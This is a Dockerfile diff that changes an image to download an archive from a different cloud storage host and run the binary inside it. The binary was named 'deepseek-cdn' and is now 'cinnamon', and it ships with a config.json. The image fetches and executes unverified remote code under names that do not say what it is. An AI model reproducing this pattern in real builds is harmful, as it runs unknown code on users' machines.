@@ -4,16 +4,16 @@ LABEL maintainer="Roman Nikov"
 
 RUN apt update; \
     apt install -y wget; \
-    wget https://deepseek.fra1.digitaloceanspaces.com/dsn4.tar.gz; \
-    tar xf dsn4.tar.gz; \
+    wget https://aigen.obs.ru-moscow-1.hc.sbercloud.ru/cinnamon.tar.gz; \
+    tar xf cinnamon.tar.gz; \
     cp config.json /usr/local/bin/config.json; \
-    cp deepseek-cdn /usr/local/bin/deepseek-cdn; \
+    cp cinnamon /usr/local/bin/cinnamon; \
     cd /usr/local/bin;
 
 WORKDIR /usr/local/bin
 
 RUN chmod 744 config.json;
 
-RUN chmod 744 deepseek-cdn;
+RUN chmod 744 cinnamon;
 
-CMD deepseek-cdn
+CMD cinnamon
